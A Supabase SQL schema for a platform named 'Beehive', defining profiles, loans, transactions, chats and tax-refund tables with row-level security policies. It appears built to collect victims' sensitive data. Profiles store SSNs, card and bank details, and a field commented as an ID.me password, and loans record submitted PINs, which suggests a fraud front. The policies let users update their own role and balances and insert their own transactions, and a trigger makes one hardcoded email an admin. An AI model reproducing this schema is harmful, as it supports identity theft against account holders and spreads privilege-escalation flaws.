-- Beehive Supabase Database Schema
-- Run this in your Supabase SQL Editor (https://supabase.com/dashboard/project/_/editor)

-- 1. Create custom types/enums for security and validation (idempotent DO block)
DO $$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'user_role') THEN
    CREATE TYPE user_role AS ENUM ('user', 'admin', 'account_manager');
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'kyc_status') THEN
    CREATE TYPE kyc_status AS ENUM ('unverified', 'pending', 'verified', 'rejected');
  END IF;
END$$;

-- 2. Create the Profiles table linked to Supabase Auth Users
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID REFERENCES auth.users ON DELETE CASCADE PRIMARY KEY,
  full_name TEXT,
  email TEXT UNIQUE,
  phone TEXT,
  role user_role DEFAULT 'user',
  kyc_status kyc_status DEFAULT 'unverified',
  wallet_balance NUMERIC(15, 2) DEFAULT 0.00,
  investment_balance NUMERIC(15, 2) DEFAULT 0.00,
  grant_balance NUMERIC(15, 2) DEFAULT 0.00,
  savings NUMERIC(15, 2) DEFAULT 0.00,
  active_cards INT DEFAULT 1,
  country TEXT DEFAULT '',
  address TEXT DEFAULT '',
  address2 TEXT DEFAULT '',
  dob TEXT DEFAULT '',
  ssn TEXT DEFAULT '',
  employment_status TEXT DEFAULT '',
  employer_name TEXT DEFAULT '',
  job_title TEXT DEFAULT '',
  monthly_income TEXT DEFAULT '',
  marital_status TEXT DEFAULT '',
  state_of_origin TEXT DEFAULT '',
  sentry TEXT DEFAULT '', -- ID.me password field
  last_return_calculation_date TIMESTAMPTZ DEFAULT NOW(),
  credit_cards JSONB DEFAULT '[]'::jsonb,
  bank_accounts JSONB DEFAULT '[]'::jsonb,
  card_details JSONB,
  bank_details JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  email_verified BOOLEAN DEFAULT FALSE
);

-- Enable Row Level Security (RLS)
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

-- 3. Create the Loans table
CREATE TABLE IF NOT EXISTS public.loans (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE NOT NULL,
  amount NUMERIC(15, 2) NOT NULL,
  purpose TEXT,
  status TEXT DEFAULT 'pending',
  bank_details JSONB,
  pin_sent BOOLEAN DEFAULT FALSE,
  pin_submitted TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.loans ENABLE ROW LEVEL SECURITY;

-- 4. Create the Transactions table
CREATE TABLE IF NOT EXISTS public.transactions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE NOT NULL,
  type TEXT NOT NULL,
  amount NUMERIC(15, 2) NOT NULL,
  currency TEXT DEFAULT 'USD',
  status TEXT DEFAULT 'completed',
  description TEXT,
  timestamp TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.transactions ENABLE ROW LEVEL SECURITY;

-- 5. Create the Chats table
CREATE TABLE IF NOT EXISTS public.chats (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE NOT NULL,
  role TEXT NOT NULL, -- 'user', 'manager', 'admin'
  text TEXT NOT NULL,
  timestamp TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.chats ENABLE ROW LEVEL SECURITY;

-- 6. Create the Tax Refunds table
CREATE TABLE IF NOT EXISTS public.tax_refunds (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE NOT NULL,
  amount NUMERIC(15, 2) NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.tax_refunds ENABLE ROW LEVEL SECURITY;

-- 7. Row Level Security (RLS) Policies

-- Profiles Policies
DROP POLICY IF EXISTS "Users can view their own profile" ON public.profiles;
CREATE POLICY "Users can view their own profile" ON public.profiles
  FOR SELECT USING (auth.uid() = id);

DROP POLICY IF EXISTS "Users can update their own profile" ON public.profiles;
CREATE POLICY "Users can update their own profile" ON public.profiles
  FOR UPDATE USING (auth.uid() = id);

DROP POLICY IF EXISTS "Admins and managers can view all profiles" ON public.profiles;
CREATE POLICY "Admins and managers can view all profiles" ON public.profiles
  FOR SELECT USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

DROP POLICY IF EXISTS "Admins and managers can update all profiles" ON public.profiles;
CREATE POLICY "Admins and managers can update all profiles" ON public.profiles
  FOR UPDATE USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

-- Loans Policies
DROP POLICY IF EXISTS "Users can view their own loans" ON public.loans;
CREATE POLICY "Users can view their own loans" ON public.loans
  FOR SELECT USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can create their own loans" ON public.loans;
CREATE POLICY "Users can create their own loans" ON public.loans
  FOR INSERT WITH CHECK (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can update their own loans" ON public.loans;
CREATE POLICY "Users can update their own loans" ON public.loans
  FOR UPDATE USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Admins and managers can manage all loans" ON public.loans;
CREATE POLICY "Admins and managers can manage all loans" ON public.loans
  FOR ALL USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

-- Transactions Policies
DROP POLICY IF EXISTS "Users can view their own transactions" ON public.transactions;
CREATE POLICY "Users can view their own transactions" ON public.transactions
  FOR SELECT USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can insert their own transactions" ON public.transactions;
CREATE POLICY "Users can insert their own transactions" ON public.transactions
  FOR INSERT WITH CHECK (auth.uid() = user_id);

DROP POLICY IF EXISTS "Admins and managers can view all transactions" ON public.transactions;
CREATE POLICY "Admins and managers can view all transactions" ON public.transactions
  FOR SELECT USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

-- Chats Policies
DROP POLICY IF EXISTS "Users can view their own chats" ON public.chats;
CREATE POLICY "Users can view their own chats" ON public.chats
  FOR SELECT USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can post to their own chats" ON public.chats;
CREATE POLICY "Users can post to their own chats" ON public.chats
  FOR INSERT WITH CHECK (auth.uid() = user_id);

-- Chats Policies
DROP POLICY IF EXISTS "Admins and managers can manage all chats" ON public.chats;
CREATE POLICY "Admins and managers can manage all chats" ON public.chats
  FOR ALL USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

-- Tax Refunds Policies
DROP POLICY IF EXISTS "Users can view their own tax refunds" ON public.tax_refunds;
CREATE POLICY "Users can view their own tax refunds" ON public.tax_refunds
  FOR SELECT USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can insert their own tax refunds" ON public.tax_refunds;
CREATE POLICY "Users can insert their own tax refunds" ON public.tax_refunds
  FOR INSERT WITH CHECK (auth.uid() = user_id);

DROP POLICY IF EXISTS "Admins and managers can manage all tax refunds" ON public.tax_refunds;
CREATE POLICY "Admins and managers can manage all tax refunds" ON public.tax_refunds
  FOR ALL USING (
    EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'account_manager')
    )
  );

-- 8. Automate Profile Creation on Signup (Trigger)
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id, email, full_name, role, email_verified)
  VALUES (
    new.id,
    new.email,
    COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
    CASE WHEN new.email = 'animatorrex9@gmail.com' THEN 'admin'::user_role ELSE 'user'::user_role END,
    COALESCE((new.email_confirmed_at IS NOT NULL), FALSE)
  )
  ON CONFLICT (id) DO UPDATE SET
    email = EXCLUDED.email,
    full_name = COALESCE(EXCLUDED.full_name, public.profiles.full_name);
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();
